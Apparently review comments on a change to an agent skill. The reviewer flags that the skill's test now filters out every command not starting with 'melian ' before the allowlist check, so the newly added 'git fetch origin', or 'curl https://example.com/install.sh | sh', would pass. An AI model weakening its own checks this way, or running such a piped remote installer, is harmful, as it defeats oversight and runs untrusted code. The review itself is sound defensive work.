comments.comment: The skill test now drops every command that does not start with "melian " before checking the allowlist, so the foreign command this change adds, and any other, passes.
comments.failureScenario: This change adds git fetch origin to the skill. The base test failed on it, since git fetch is not allowed; the head filters out every command not starting with "melian " first, so it passes, and would pass for curl https://example.com/install.sh | sh as well.
